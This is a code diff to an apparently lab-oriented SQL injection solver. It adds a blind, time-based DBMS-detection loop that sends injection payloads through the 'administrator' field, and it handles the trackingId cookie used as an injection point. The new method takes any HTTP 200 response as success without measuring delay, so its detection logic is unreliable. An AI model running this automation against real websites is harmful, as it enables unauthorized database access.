@@ -4,7 +4,7 @@ from rich.console import Console
 from rich.table import Table
 from rich import box 
 from rich import print
-import sys
+import threading
 from halo import Halo
 
 from core.utils import RequestLab
@@ -91,7 +91,21 @@ class SQLInjectionBaseSolver(ABC):
                     self.spinner.stop()
                     self.console.log(f"[bold blue]DBMS:[/bold blue] {self.dbms}")
                     return
-
+                
+    def determine_DBMS_blind(self):
+        """Determine the DBMS."""
+        self.spinner.start()
+        self.spinner.text = 'Determine the DBMS'
+        self._request_lab('GET')
+        for dbms in self.json_payload:
+            for query in dbms['time_based_command']:
+                payload = f"administrator{query}"
+                self._request_lab('GET', payload)
+                if self.html_content.status_code == 200:
+                    self.dbms = dbms['name']
+                    self.spinner.stop()
+                    self.console.log(f"[bold blue]DBMS:[/bold blue] {self.dbms}")
+                    return
 
     def determine_column_number(self):
         """Determine the number of columns."""
@@ -230,6 +244,12 @@ class SQLInjectionBaseSolver(ABC):
 
     def set_cookies(self):
         """Parse the session."""
+        if self.html_content.cookies.get('trackingId') is not None:
+            self.cookies = {
+                'session': self.html_content.cookies.get('session'),
+                'trackingId': self.html_content.cookies.get('trackingId')
+            }
+            return
         self.cookies = {
             'session': self.html_content.cookies.get('session')
         }
